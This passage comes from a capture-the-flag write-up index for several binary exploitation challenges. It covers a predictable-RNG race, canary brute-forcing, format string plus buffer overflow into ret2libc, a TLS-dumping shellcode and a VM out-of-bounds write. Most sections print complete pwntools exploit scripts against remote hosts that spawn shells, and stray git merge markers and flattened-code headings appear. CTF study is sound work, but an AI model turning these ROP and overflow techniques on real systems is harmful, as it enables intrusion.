Race Conditions (or precise state management) between the main process and a spawned thread.</p> <ol> <li>Predictable RNG: The program seeds the random number generator with <code>time(NULL)</code> at the start of <code>main</code>. <pre><code>seed = time((time_t *)0x0);\nsrand((uint)seed);\n</code></pre></li> </ol> <p>Since we know the server's time (roughly), we can seed our own local RNG in the exploit script to perfectly predict every <code>rand()</code> call. 2. Thread Interaction: When Option 3 is selected: * A background thread (<code>FUN_00400fab</code>) is spawned. This thread accesses the global firewall state variable (<code>DAT_006020dc</code>) and calls <code>rand()</code>. * The main thread executes <code>FUN_00401010</code>, which also calls <code>rand()</code> to determine the attack type.</p>"},{"location":"cyberedu/pwn/honeypot/description/#exploit-steps","title":"Exploit Steps","text":"<p>The goal is to survive enough rounds to flag the challenge. To do this, we must block every attack while ensuring the background thread executes its logic correctly.</p>"},{"location":"cyberedu/pwn/honeypot/description/#1-syncing-the-rng","title":"1. Syncing the RNG","text":"<p>We load the standard C library (<code>libc</code>) in our Python script and call <code>srand(time(0))</code> immediately before connecting. This synchronizes our random sequence with the server's.</p>"},{"location":"cyberedu/pwn/honeypot/description/#2-the-bait-and-switch-strategy","title":"2. The \"Bait and Switch\" Strategy","text":"<p>To survive a round, we have to manage the global <code>firewall</code> variable so it satisfies both the background thread and the main thread, which run almost simultaneously.</p> <ul> <li>Step A: Set Bait (Option 2) We use Option 2 to set the global firewall state to <code>1</code>. This prepares the state for the background thread that is about to launch.</li> <li>Step B: Predict (Local Simulation) In our script, we simulate the RNG consumption:</li> <li><code>thread_burn = libc.rand()</code>: This value accounts for the <code>rand()</code> call made by the background thread.</li> <li> <p><code>attack_val = libc.rand() &amp; 3</code>: This is the attack type the main thread will generate.</p> </li> <li> <p>Step C: Trigger &amp; Switch (Option 3) We select Option 3.</p> </li> <li>The thread spawns and reads our \"Bait\" (Firewall=1).</li> <li>The main thread immediately asks for new firewall input.</li> <li>We send the <code>attack_val</code> we predicted in Step B.</li> </ul> <p>By updating the firewall variable just in time, we successfully block the main attack (matching <code>attack_val</code>) while having allowed the thread to see the previous state. Repeating this loop allows us to survive indefinitely/until the win condition is met.</p>"},{"location":"cyberedu/pwn/honeypot/description/#exploit-script","title":"Exploit Script","text":"<p>Here is the final solution:</p> <pre><code>from pwn import *\nimport ctypes\nfrom ctypes.util import find_library\nimport time\n\nTARGET_TYPE = 'remote'\nBINARY_PATH = './pwn_honeypot'\nHOST = '34.40.105.109'\nPORT = 32229\n\nlibc_name = find_library('c')\nlibc = ctypes.CDLL(libc_name)\n\ndef get_process():\n    if TARGET_TYPE == 'local':\n        return process(BINARY_PATH)\n    else:\n        return remote(HOST, PORT)\n\ndef solve():\n    p = get_process()\n\n    # 1. Sync RNG\n    now = int(time.time())\n    libc.srand(now)\n\n    p.sendlineafter(b\"What's your name?\", b\"Hacker\")\n\n    round_count = 0\n\n    try:\n        while True:\n            round_count += 1\n\n            thread_burn = libc.rand()\n\n            attack_val = libc.rand() &amp; 3\n\n            log.info(f\"Round {round_count} | Thread uses {thread_burn % 30} dmg | Predicting Main Attack: {attack_val}\")\n\n            p.sendline(b\"2\")\n            p.recvuntil(b\"Firewall Option:\")\n            p.sendline(b\"1\")\n\n            p.recvuntil(b\"Enter option:\")\n            p.sendline(b\"3\")\n\n            output = p.recvuntil(b\"Firewall Option:\", drop=False).decode(errors='ignore')\n\n            if \"You won\" in output or \"flag\" in output:\n                print(\"\\nwin\")\n                print(output) \n                print(p.recvall(timeout=1).decode(errors='ignore')) \n                break\n\n            if \"Game Over\" in output:\n                print(\"Failed: Game Over\")\n                break\n\n            p.sendline(str(attack_val).encode())\n\n    except EOFError:\n        print(\"\\n[!] Connection closed. Checking buffer for flag...\")\n        print(p.recvall(timeout=1).decode(errors='ignore'))\n    except Exception as e:\n        log.error(f\"Error: {e}\")\n\nsolve()\n</code></pre>"},{"location":"cyberedu/pwn/off/description/","title":"Description","text":""},{"location":"cyberedu/pwn/off/description/#forking-server-exploit-writeup","title":"Forking Server Exploit Writeup","text":""},{"location":"cyberedu/pwn/off/description/#vulnerability-analysis","title":"Vulnerability Analysis","text":"<p>The challenge binary exhibits two key behaviors that define the exploitation strategy:</p> <ol> <li>Forking Server: The <code>main</code> function enters an infinite loop where it <code>fork()</code>s a new child process for every connection.</li> <li> <p>Crucial Detail: <code>fork()</code> creates an exact copy of the parent process, meaning the Stack Canary and ASLR base remain constant across all connections until the parent process is restarted.</p> </li> <li> <p>Stack Buffer Overflow: The <code>handle_client</code> function declares a 1032-byte buffer (<code>local_418</code>) but populates it using <code>unbounded_read</code>. This allows us to overwrite the Stack Canary and the Return Address.</p> </li> </ol>"},{"location":"cyberedu/pwn/off/description/#exploit-steps","title":"Exploit Steps","text":""},{"location":"cyberedu/pwn/off/description/#1-brute-forcing-the-canary","title":"1. Brute-Forcing the Canary","text":"<p>Since the canary is static across connections, we can guess it byte-by-byte. If we guess incorrectly, the child crashes (<code>__stack_chk_fail</code>) and the parent spawns a new one. If we guess correctly, the child executes normally.</p> <ul> <li>Method:</li> <li>Send <code>1032</code> bytes of padding (filling the buffer).</li> <li>Append the bytes we have already found (initially empty).</li> <li>Append one guess byte (0x00 - 0xFF).</li> <li>Check if the server replies with \"Done for this round\".</li> <li>Yes: Byte is correct. Append to known canary and move to the next byte.</li> <li>No (EOF/Crash): Byte is wrong. Try next value.</li> </ul>"},{"location":"cyberedu/pwn/off/description/#2-leaking-libc-rop","title":"2. Leaking Libc (ROP)","text":"<p>Once we have the full canary, we can bypass the stack check and overwrite the Return Address (RIP). To defeat ASLR, we construct a ROP chain to leak a GOT address.</p> <ul> <li>Payload Construction:</li> <li>Padding: 1032 bytes.</li> <li>Canary: The 8 bytes found in Step 1.</li> <li>RBP: 8 bytes of junk.</li> <li>Gadget: <code>pop rdi; ret</code> (loads arguments for function call).</li> <li>Arg: <code>puts@got</code> (we want to print the real address of <code>puts</code>).</li> <li>Function: <code>puts@plt</code> (call <code>puts</code>).</li> <li>Return: <code>entry_point</code> (0x4006a0). We loop back to the start of the program so the process doesn't die, allowing us to send a second payload.</li> </ul>"},{"location":"cyberedu/pwn/off/description/#3-calculating-offsets-getting-shell","title":"3. Calculating Offsets &amp; Getting Shell","text":"<p>The server leaks the real memory address of <code>puts</code>. We use this to calculate the base address of <code>libc</code>.</p> <ul> <li><code>libc_base</code> = <code>leak</code> - <code>puts_offset</code></li> <li><code>system_addr</code> = <code>libc_base</code> + <code>system_offset</code></li> <li><code>bin_sh_addr</code> = <code>libc_base</code> + <code>bin_sh_offset</code></li> </ul>"},{"location":"cyberedu/pwn/off/description/#4-final-payload-ret2libc","title":"4. Final Payload (Ret2Libc)","text":"<p>We send a final payload to trigger a shell.</p> <ul> <li>Payload Construction:</li> <li>Padding: 1032 bytes.</li> <li>Canary: Correct canary.</li> <li>RBP: Junk.</li> <li>Stack Align: <code>ret</code> gadget (needed for <code>system</code> calls on x64 to align stack to 16 bytes).</li> <li>Gadget: <code>pop rdi; ret</code>.</li> <li>Arg: <code>bin_sh_addr</code>.</li> <li>Function: <code>system_addr</code>.</li> </ul> <pre><code># Final Payload Structure\npayload = flat(\n    b'p' * 1032,           # Padding to Canary\n    canary,                # Leaked Canary\n    b'w' * 8,              # Saved RBP\n    ret_gadget,            # Align Stack\n    pop_rdi_ret_gadget,    # Setup Arg 1\n    str_bin_sh_addr,       # \"/bin/sh\"\n    system_address         # system()\n)\n</code></pre>"},{"location":"cyberedu/pwn/off/description/#exploit-script","title":"Exploit Script","text":"<p>Here is the final solution:</p>"},{"location":"cyberedu/pwn/off/description/#from-pwn-import-import-sys-exe-elfpwn-contextbinary-exe-contextlog_level-info-contextarch-amd64-p-processexepath-p-remote3524222811432241-bad-characters-for-scanf-whitespace-bad_chars-0x09-0x0a-0x0b-0x0c-0x0d-0x20-bad_chars-0xa-def-is_safe_addraddr-checks-if-an-address-contains-any-bad-characters-addr_bytes-p64addr-for-b-in-addr_bytes-if-b-in-bad_chars-return-false-return-true-def-brute_force_canary-precvuntilbwhat-do-you-want-to-don-canary-b-loginfostarting-canary-brute-force-for-i-in-range8-found_byte-false-for-byte-in-range256-if-i-0-and-byte-0-continue-if-byte-in-bad_chars-continue-skip-whitespace-try-precvuntilbim-here-to-serve-you-n-except-eoferror-logcriticalparent-process-died-sysexit1-guess-bytesbyte-payload-ba-1032-canary-guess-psendlinepayload-try-response-precvuntilbdone-for-this-round-timeout005-if-bdone-for-this-round-in-response-canary-guess-logsuccessfbyte-found-hexbyte-canary-canaryhex-found_byte-true-break-except-pass-if-not-found_byte-logerrorfailed-to-find-byte-canary-contains-a-bad-char-sysexit1-return-canary-1-get-canary-canary-brute_force_canary-canary-p640x001a56e396efd18d-logsuccessffinal-canary-canaryhex-ret_gadget-0x00000000004005f1-pop_rdi_ret_gadget-0x00000000004009b3-entry_address-0x004006a0-puts_got-exegotputs-puts_plt-exepltputs-payload-bb-1032-pad-payload-canary-leave-canary-intact-payload-bc-8-fill-rbp-payload-p64pop_rdi_ret_gadget-pop-puts-got-into-the-rdi-payload-p64puts_got-pointer-to-the-real-address-payload-p64puts_plt-payload-p64entry_address-psendlineafterim-here-to-serve-you-npayload-get-the-puts-address-loginfopayload-sent-parsing-leak-try-precvuntilbb-1032-precv1-leak_data-precvlinestrip-if-not-leak_data-logerrorleak-data-is-empty-sysexit1-puts_leak-u64leak_dataljust8-bx00-logsuccessfleaked-puts-address-hexputs_leak-except-exception-as-e-logerrorffailed-to-parse-leak-e-sysexit1-pwn-that-shit-now-we-will-guess-the-offsets-puts_offset-0x6f690-system_offset-0x45390-str_bin_sh_offset-0x18cd57-these-are-for-local-testing-puts_offset-0x080e50-system_offset-0x050d70-str_bin_sh_offset-0x1d8678-libc_base_addr-puts_leak-puts_offset-system_address-libc_base_addr-system_offset-str_bin_sh_addr-libc_base_addr-str_bin_sh_offset-payload-bp-1032-reach-canary-payload-canary-keep-intact-payload-bw-8-fill-rbp-with-trash-payload-p64ret_gadget-payload-p64pop_rdi_ret_gadget-payload-p64str_bin_sh_addr-payload-p64system_address-pwned-psendlineafterbim-here-to-serve-you-npayload-pinteractive-head","title":"<pre><code>from pwn import *\nimport sys\n\nexe = ELF('./pwn')\ncontext.binary = exe\ncontext.log_level = 'info'\ncontext.arch = 'amd64'\n# p = process([exe.path])\np = remote('35.242.228.114',32241)\n# Bad characters for scanf (Whitespace)\nbad_chars = [0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20]\n# bad_chars = [0xa]\ndef is_safe_addr(addr):\n    \"\"\"Checks if an address contains any bad characters.\"\"\"\n    addr_bytes = p64(addr)\n    for b in addr_bytes:\n        if b in bad_chars:\n            return False\n    return True\n\ndef brute_force_canary():\n    p.recvuntil(b\"What do you want to do?\\n\")\n    canary = b\"\"\n    log.info(\"Starting Canary Brute-force...\")\n\n    for i in range(8):\n        found_byte = False\n        for byte in range(256):\n            if i == 0 and byte != 0: continue\n            if byte in bad_chars: continue # Skip whitespace\n\n            try:\n                p.recvuntil(b\"I'm here to serve you. :-)\\n\")\n            except EOFError:\n                log.critical(\"Parent process died!\")\n                sys.exit(1)\n\n            guess = bytes([byte])\n            payload = b\"A\" * 1032 + canary + guess\n            p.sendline(payload)\n\n            try:\n                response = p.recvuntil(b\"Done for this round\", timeout=0.05)\n                if b\"Done for this round\" in response:\n                    canary += guess\n                    log.success(f\"Byte found: {hex(byte)} | Canary: {canary.hex()}\")\n                    found_byte = True\n                    break\n            except:\n                pass\n        if not found_byte:\n            log.error(\"Failed to find byte! Canary contains a bad char.\")\n            sys.exit(1)\n\n    return canary\n\n# 1. get Canary\ncanary = brute_force_canary()\n\n# canary = p64(0x001a56e396efd18d)\nlog.success(f\"Final Canary: {canary.hex()}\")\n\nret_gadget = 0x00000000004005f1\npop_rdi_ret_gadget = 0x00000000004009b3\nentry_address = 0x004006a0\nputs_got = exe.got['puts']\nputs_plt = exe.plt['puts']\n\n\npayload = b'b' * 1032 # pad\npayload += canary # leave canary intact\npayload += b'c' * 8 # fill rbp\npayload += p64(pop_rdi_ret_gadget) # pop puts got into the rdi\npayload += p64(puts_got) # pointer to the real address\npayload += p64(puts_plt)\npayload += p64(entry_address)\n\np.sendlineafter(\"I'm here to serve you. :-)\\n\",payload)\n\n# get the puts address\nlog.info(\"Payload sent. Parsing leak...\")\n\ntry:\n    p.recvuntil(b'b' * 1032)\n\n    p.recv(1)\n\n    leak_data = p.recvline().strip()\n\n    if not leak_data:\n        log.error(\"Leak data is empty!\")\n        sys.exit(1)\n\n    puts_leak = u64(leak_data.ljust(8, b\"\\x00\"))\n    log.success(f\"Leaked puts address: {hex(puts_leak)}\")\n\nexcept Exception as e:\n    log.error(f\"Failed to parse leak: {e}\")\n    sys.exit(1)\n\n\n# pwn that shit\n\n# now we will guess the offsets\nputs_offset = 0x6f690\nsystem_offset = 0x45390\nstr_bin_sh_offset = 0x18cd57\n# these are for local testing\n# puts_offset = 0x080e50\n# system_offset = 0x050d70\n# str_bin_sh_offset = 0x1d8678\n\nlibc_base_addr = puts_leak - puts_offset\nsystem_address = libc_base_addr + system_offset\nstr_bin_sh_addr = libc_base_addr + str_bin_sh_offset\n\npayload = b'p' * 1032 # reach canary\npayload += canary # keep intact\npayload += b'w' * 8 # fill rbp with trash\npayload += p64(ret_gadget)\npayload += p64(pop_rdi_ret_gadget)\npayload += p64(str_bin_sh_addr)\npayload += p64(system_address)\n\n# pwned\np.sendlineafter(b\"I'm here to serve you. :-)\\n\",payload)\n\np.interactive()\n&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD\n</code></pre>","text":"<p>```</p> <p>1c8cbb4b35e5b68cb6f94e8ff015807418ee2142</p>"},{"location":"cyberedu/pwn/secret/description/","title":"Description","text":""},{"location":"cyberedu/pwn/secret/description/#secret-challenge-writeup","title":"Secret Challenge Writeup","text":""},{"location":"cyberedu/pwn/secret/description/#vulnerability-analysis","title":"Vulnerability Analysis","text":"<p>The binary contains two distinct vulnerabilities that must be chained together to achieve code execution:</p> <ol> <li>**Format String Vulnerability in <code>main()**</code>: <pre><code>read(0, buffer, 0x40);\nprintf(\"Hillo \");\nprintf(buffer); // VULN: User input passed directly to printf\n</code></pre></li> </ol> <p>This allows us to leak values from the stack. 2. **Stack Buffer Overflow in <code>secret()**</code>: <pre><code>gets(buffer); // VULN: Unbounded write (buffer is 136 bytes)\n</code></pre></p> <p>The <code>gets</code> function allows us to overwrite the stack, including the canary and the return address.</p>"},{"location":"cyberedu/pwn/secret/description/#exploit-steps","title":"Exploit Steps","text":"<p>Since the binary has PIE (Position Independent Executable) and Stack Canaries enabled, we cannot jump directly to known addresses or overflow the buffer blindly.</p>"},{"location":"cyberedu/pwn/secret/description/#1-leak-canary-and-pie-base","title":"1. Leak Canary and PIE Base","text":"<p>We use the format string vulnerability in <code>main</code> to leak the necessary addresses.</p> <ul> <li>Canary: Located at offset 15 (<code>%15$p</code>).</li> <li>Return Address: Located at offset 21 (<code>%21$p</code>). This leaks an address inside <code>main</code> (specifically <code>__libc_start_main+x</code>), allowing us to calculate the binary's base address.</li> </ul>"},{"location":"cyberedu/pwn/secret/description/#2-rop-chain-1-leak-libc","title":"2. ROP Chain 1: Leak Libc","text":"<p>Now inside <code>secret()</code>, we trigger the buffer overflow. We construct a ROP chain to leak a libc address (<code>puts</code>) to bypass ASLR.</p> <ul> <li>Payload: <code>Padding (136)</code> + <code>Canary</code> + <code>RBP (8)</code> + <code>ROP Chain</code>.</li> <li>Chain:</li> <li><code>pop rdi; ret</code> (Gadget)</li> <li><code>puts@got</code> (Argument: Address of puts entry in GOT)</li> <li><code>puts@plt</code> (Function: Call puts to print the address)</li> <li><code>_start</code> (Return: Restart the program to send a second payload)</li> </ul>"},{"location":"cyberedu/pwn/secret/description/#3-calculate-libc-base","title":"3. Calculate Libc Base","text":"<p>We receive the leaked address of <code>puts</code>. Using a libc database (or the provided libc), we calculate the base address:</p> <pre><code>libc.address = leak_puts - libc.symbols['puts']\n</code></pre>"},{"location":"cyberedu/pwn/secret/description/#4-rop-chain-2-get-shell","title":"4. ROP Chain 2: Get Shell","text":"<p>The program restarts (thanks to <code>_start</code>). We bypass the name prompt and reach <code>secret()</code> again. Now we send the final ROP chain to spawn a shell.</p> <ul> <li>Chain:</li> <li><code>ret</code> (Gadget: Align stack to 16 bytes for <code>system</code>)</li> <li><code>pop rdi; ret</code></li> <li><code>address of \"/bin/sh\"</code></li> <li><code>system</code></li> </ul>"},{"location":"cyberedu/pwn/secret/description/#visual-exploit-flow","title":"Visual Exploit Flow","text":""},{"location":"cyberedu/pwn/secret/description/#final-payload-structure","title":"Final Payload Structure","text":"<pre><code>payload = flat(\n    b'a' * 136,            # Buffer Padding\n    canary,                # Restore Canary (Must be correct!)\n    b'b' * 8,              # Overwrite Saved RBP\n    ret_gadget,            # Stack Alignment\n    pop_rdi,               # Load Argument\n    bin_sh_addr,           # \"/bin/sh\"\n    system_addr            # Call system()\n)\n</code></pre>"},{"location":"cyberedu/pwn/secret/description/#exploit-script","title":"Exploit Script","text":"<p>Here is the final solution:</p>"},{"location":"cyberedu/pwn/secret/description/#from-pwn-import-p-processpwn_secret-p-remote344010510930865-binary_path-pwn_secret-elf-elfbinary_path-contextbinary-elf-contextlog_level-debug-contextarch-amd64-precvuntilbname-psendlineb15p21p-offset-15-is-the-canary-and-offset-19-is-the-entry-addr-precvuntilbhillo-leaks-precvlinestripdecodesplit-canary-intleaks0-16-code_leak-intleaks1-16-logsuccessfcanary-hexcanary-logsuccessfcode-leak-hexcode_leak-elfaddress-code_leak-0xb6d-main-address-logsuccessfbinary-base-hexelfaddress-0x0000000000000889-ret-0x0000000000000ca3-pop-rdi-ret-ret_gadget-0x0000000000000889-pop_rdi_ret_gadget-0x0000000000000ca3-ret_addr-elfaddress-ret_gadget-pop_rdi_ret-elfaddress-pop_rdi_ret_gadget-puts_got-p64elfgotputs-puts_plt-p64elfpltputs-start_addr-p64elfsymbols_start-payload-ba-136-reach-canary-payload-p64canary-keep-intact-payload-bb-8-fill-rbp-jumping-jack-flash-payload-p64pop_rdi_ret-payload-puts_got-payload-puts_plt-payload-start_addr-precvuntilbphrase-psendlinepayload-precvuntilbentered-strings-are-not-samen-try-leak_data-precvlinestrip-sometimes-puts-outputs-6-bytes-sometimes-padded-we-unpack-it-carefully-leak_puts-u64leak_dataljust8-bx00-logsuccessfleaked-putsglibc-hexleak_puts-except-logerrorfailed-to-receive-leak-check-offsets-now-lets-fuzz-the-libc-version-we-will-try-different-offsets-based-on-the-puts-termination-e50-searching-in-libc-database-puts_offset-0x6f690-libc_base_address-leak_puts-puts_offset-system_offset-0x45390-str_bin_sh_offset-0x18cd57-system_address-libc_base_address-system_offset-str_bin_sh_address-libc_base_address-str_bin_sh_offset-precvuntilbname-psendlineyou-are-pwned-precvuntilbhillo-precvuntilbphrase-payload-ba-136-reach-canary-again-payload-p64canary-payload-bb-8-rbp-jump-again-but-this-time-in-libc-payload-p64ret_addr-payload-p64pop_rdi_ret-payload-p64str_bin_sh_address-payload-p64system_address-psendlinepayload-pinteractive-head","title":"<pre><code>from pwn import *\n\n# p = process('./pwn_secret')\np = remote('34.40.105.109',30865)\n\n\nbinary_path = './pwn_secret'\nelf = ELF(binary_path)\ncontext.binary = elf\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\n\np.recvuntil(b'Name: ')\np.sendline(b'%15$p|%21$p') # offset 15 is the canary and offset 19 is the entry addr\n\np.recvuntil(b'Hillo ')\nleaks = p.recvline().strip().decode().split('|')\n\ncanary = int(leaks[0], 16)\ncode_leak = int(leaks[1], 16)\nlog.success(f\"Canary: {hex(canary)}\")\nlog.success(f\"Code leak : {hex(code_leak)}\")\n\nelf.address = code_leak - 0xb6d # main address\nlog.success(f\"binary base: {hex(elf.address)}\")\n\n# 0x0000000000000889 : ret\n# 0x0000000000000ca3 : pop rdi ; ret\n\nret_gadget = 0x0000000000000889\npop_rdi_ret_gadget = 0x0000000000000ca3\n\nret_addr = elf.address + ret_gadget\npop_rdi_ret = elf.address + pop_rdi_ret_gadget\n\nputs_got = p64(elf.got['puts'])\nputs_plt = p64(elf.plt['puts'])\nstart_addr = p64(elf.symbols['_start'])\n\npayload = b'a' * 136 # reach canary\npayload += p64(canary) # keep intact\npayload += b'b' * 8 # fill rbp\n# jumping jack flash\npayload += p64(pop_rdi_ret)\npayload += puts_got\npayload += puts_plt\npayload += start_addr\n\np.recvuntil(b'Phrase: ')\np.sendline(payload)\n\np.recvuntil(b'Entered strings are not same!\\n')\n\ntry:\n    leak_data = p.recvline().strip()\n    # Sometimes puts outputs 6 bytes, sometimes padded.\n    # We unpack it carefully.\n    leak_puts = u64(leak_data.ljust(8, b'\\x00'))\n    log.success(f\"Leaked puts@GLIBC: {hex(leak_puts)}\")\nexcept:\n    log.error(\"Failed to receive leak. Check offsets.\")\n\n# now let's fuzz the libc version, we will try different offsets based on the puts termination e50, searching in libc database\n\nputs_offset = 0x6f690\n\nlibc_base_address = leak_puts - puts_offset\n\nsystem_offset = 0x45390\nstr_bin_sh_offset = 0x18cd57\n\nsystem_address = libc_base_address + system_offset\nstr_bin_sh_address = libc_base_address + str_bin_sh_offset\n\np.recvuntil(b'Name: ')\np.sendline(\"you are pwned!\")\n\np.recvuntil(b'Hillo ')\np.recvuntil(b'Phrase: ')\n\npayload = b'a' * 136 # reach canary again\npayload += p64(canary)\npayload += b'b' * 8 # rbp\n# jump again, but this time in libc\npayload += p64(ret_addr)\npayload += p64(pop_rdi_ret)\npayload += p64(str_bin_sh_address)\npayload += p64(system_address)\n\np.sendline(payload)\n\np.interactive()\n&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD\n</code></pre>","text":"<p>```</p> <p>1c8cbb4b35e5b68cb6f94e8ff015807418ee2142</p>"},{"location":"cyberedu/pwn/threadz/description/","title":"Description","text":""},{"location":"cyberedu/pwn/threadz/description/#threads-challenge-writeup","title":"Threads Challenge Writeup","text":""},{"location":"cyberedu/pwn/threadz/description/#challenge-overview","title":"Challenge Overview","text":"<p>Description: The challenge provides a service that accepts and executes shellcode in an RWX mmapped region. No binary is provided. Hint: The description emphasizes \"Threads\" and mentions that secrets are stored using <code>__thread</code> variables (Thread Local Storage). Flag Format: The flag is split into 4-byte <code>unsigned int</code> chunks, with characters reversed within each chunk.</p>"},{"location":"cyberedu/pwn/threadz/description/#vulnerability-analysis","title":"Vulnerability Analysis","text":"<p>The core vulnerability is Arbitrary Shellcode Execution. However, the difficulty lies in locating the flag in memory without a binary to reverse engineer.</p> <p>The key hint is the usage of <code>volatile __thread</code>. On Linux x86-64 systems, Thread Local Storage (TLS) is managed via the FS segment register.</p> <ul> <li>The <code>FS</code> register points to the Thread Control Block (TCB).</li> <li>Local thread variables (like the flag chunks mentioned) are typically stored immediately before the address pointed to by <code>FS</code> (at negative offsets).</li> </ul>"},{"location":"cyberedu/pwn/threadz/description/#exploit-steps","title":"Exploit Steps","text":""},{"location":"cyberedu/pwn/threadz/description/#1-locate-thread-local-storage-tls","title":"1. Locate Thread Local Storage (TLS)","text":"<p>To access the TLS area, we need the linear address of the TCB. In x86-64 assembly, we cannot read the <code>FS</code> register directly to get the address, but the TCB contains a pointer to itself at <code>fs:[0]</code>.</p>"},{"location":"cyberedu/pwn/threadz/description/#2-dump-memory","title":"2. Dump Memory","text":"<p>We construct shellcode to:</p> <ol> <li>Read the TCB address from <code>fs:[0]</code>.</li> <li>Subtract an offset (e.g., <code>0x200</code>) to point to the start of the TLS variables.</li> <li>Perform a <code>sys_write</code> syscall to dump this memory region to <code>stdout</code>.</li> </ol> <pre><code>/* 1. Get the address of the Thread Control Block (FS Base) */\nmov rsi, qword ptr fs:[0]\n\n/* 2. Move pointer back to cover TLS variables\n      TLS data is located at negative offsets relative to FS base.\n      0x200 is a safe heuristic range. */\nsub rsi, 0x200\n\n/* 3. Write memory to stdout (File Descriptor 1) */\nmov rax, 1          /* sys_write */\nmov rdi, 1          /* stdout */\nmov rdx, 0x300      /* length to dump */\nsyscall\n\n/* 4. Exit */\nmov rax, 60\nxor rdi, rdi\nsyscall\n</code></pre>"},{"location":"cyberedu/pwn/threadz/description/#3-reconstruct-flag","title":"3. Reconstruct Flag","text":"<p>The output will be a raw memory dump. According to the description, the flag is stored as integers representing 4-character chunks, reversed.</p> <p>Example Dump Pattern: If the dump contains <code>... {CFT ...</code>, it corresponds to the chunk <code>volatile __thread unsigned int flag1 = '{CFT';</code>.</p> <ul> <li>Reversed: <code>TFC{</code></li> </ul> <p>We simply parse the dump for printable strings and reverse every 4-byte chunk to assemble the final flag.</p>"},{"location":"cyberedu/pwn/threadz/description/#exploit-script","title":"Exploit Script","text":"<p>Here is the final solution:</p> <pre><code>from pwn import *\n\ncontext.arch = 'amd64'\ncontext.os = 'linux'\n\nio = remote('34.89.163.72', 31829)\n\nshellcode_asm = \"\"\"\n    /* 1. Get the address of the Thread Control Block (FS Base) */\n    mov rsi, qword ptr fs:[0]\n\n    /* 2. Move back a SAFE amount (0x200 = 512 bytes).\n       0x1000 was likely hitting unmapped memory.\n       The flag is likely right next to the FS base. */\n    sub rsi, 0x200\n\n    /* 3. Dump 0x300 bytes.\n       This reads from [FS-0x200] to [FS+0x100].\n       This range covers the TLS variables (flag) and the TCB itself. */\n    mov rax, 1          /* sys_write */\n    mov rdi, 1          /* stdout */\n    mov rdx, 0x300      /* length */\n    syscall\n\n    /* 4. Exit cleanly */\n    mov rax, 60\n    xor rdi, rdi\n    syscall\n\"\"\"\n\npayload_leak_string = asm(shellcode_asm)\nshellcode_asm_sh = shellcraft.sh()\npayload = asm(shellcode_asm_sh)\n\nprint(io.recvuntil(b'shellcodez!!!\\n').decode())\n\nio.send(payload_leak_string)\n\noutput = io.recvall()\n\nprint(f\"\\n[+] Received {len(output)} bytes of dump.\")\n\n\nif len(output) &gt; 0:\n    print(\"\\n[+] Hexdump around potential flag area:\")\n    print(hexdump(output))\n\n    print(\"\\n[+] Attempting to extract strings:\")\n    # Filter for printable strings to help spot the flag\n    import re\n    strings = re.findall(b'[ -~]{4,}', output)\n    for s in strings:\n        print(f\"Found string: {s.decode(errors='ignore')}\")\nelse:\n    print(\"[-] Still no output. The offset might still be invalid or syscalls are restricted.\")\n\nio.close()\n</code></pre>"},{"location":"cyberedu/pwn/virtual/description/","title":"Description","text":""},{"location":"cyberedu/pwn/virtual/description/#vm-challenge-writeup","title":"VM Challenge Writeup","text":""},{"location":"cyberedu/pwn/virtual/description/#vulnerability-analysis","title":"Vulnerability Analysis","text":"<p>The challenge implements a custom stack-based Virtual Machine. The <code>VM</code> structure is allocated on the stack in <code>main</code>. The vulnerability lies in the <code>STR</code> (Store) instruction (Opcode 2).</p> <pre><code>case 2: // STR: Store Register to Memory\n  // ... checks bounds of bytecode ...\n  uVar5 = *(uint32_t *)(vm-&gt;bytecode + vm-&gt;ip); // Read 32-bit Index\n  vm-&gt;ip = vm-&gt;ip + 4;\n  uVar2 = vm-&gt;bytecode[vm-&gt;ip]; // Read Register Index\n  vm-&gt;ip = vm-&gt;ip + 1;\n  Exec_Str(vm,uVar5,uVar2); // vm.memory[uVar5] = vm.regs[uVar2]\n  break;\n</code></pre> <p>The <code>Exec_Str</code> function uses <code>uVar5</code> as an index into the <code>vm.memory</code> array without validating if it falls within the bounds of the allocated memory. Since the <code>VM</code> struct (and its memory) resides on the stack, providing a large index allows for an Out-of-Bounds (OOB) Write, enabling us to overwrite the saved return address of the <code>main</code> function.</p>"},{"location":"cyberedu/pwn/virtual/description/#exploit-steps","title":"Exploit Steps","text":"<p>To exploit this, we generate a custom bytecode file that constructs a ROP chain on the stack using the VM's <code>MOV</code> and <code>STR</code> instructions.</p>"},{"location":"cyberedu/pwn/virtual/description/#1-primitive-arbitrary-stack-write","title":"1. Primitive: Arbitrary Stack Write","text":"<p>We define a helper pattern in the bytecode to write 64-bit values (addresses) onto the stack. Since the VM operates on 32-bit integers, we must split every 64-bit address into two 32-bit writes.</p> <ol> <li>MOV value (Lower 32 bits) into Register 0.</li> <li>STR Register 0 into <code>vm.memory[Index]</code>.</li> <li>MOV value (Upper 32 bits) into Register 0.</li> <li>STR Register 0 into <code>vm.memory[Index + 1]</code>.</li> </ol>"},{"location":"cyberedu/pwn/virtual/description/#2-offset-calculation","title":"2. Offset Calculation","text":"<p>By debugging (or fuzzing), we determine that index 265 in the <code>vm.memory</code> array corresponds to the location of the Return Address (RIP) on the stack.</p>"},{"location":"cyberedu/pwn/virtual/description/#3-rop-chain-construction","title":"3. ROP Chain Construction","text":"<p>We overwrite the return address with a standard ROP chain to execute <code>system(\"/bin/sh\")</code>.</p> <ul> <li>**Gadget 1: <code>pop rdi; ret**</code></li> <li> <p>Loads the address of the command string into the <code>RDI</code> register (first argument for <code>system</code>).</p> </li> <li> <p>**Argument: <code>/bin/sh**</code></p> </li> <li> <p>The address of the string <code>\"/bin/sh\"</code> found within the binary.</p> </li> <li> <p>**Gadget 2: <code>ret**</code></p> </li> <li> <p>A simple return gadget used to align the stack to 16 bytes (required by <code>glibc</code> <code>system</code> calls to avoid crashes).</p> </li> <li> <p>**Function: <code>system@plt**</code></p> </li> <li>Calls the system function.</li> </ul>"},{"location":"cyberedu/pwn/virtual/description/#4-execution","title":"4. Execution","text":"<p>The program executes our bytecode. It performs the memory writes, effectively placing our ROP chain where the return address should be. When <code>main</code> returns (or when <code>VM_Run</code> returns, depending on the exact stack frame layout), execution flow redirects to our chain, spawning a shell.</p> <pre><code># Conceptual Bytecode Logic\n# Writing POP_RDI (0x4012fa) to Offset 265\nMOV R0, 0x004012fa  # Lower 32 bits\nSTR [265], R0       # Write to stack\nMOV R0, 0x00000000  # Upper 32 bits\nSTR [266], R0       # Write to stack\n# ... Repeat for /bin/sh addr, RET 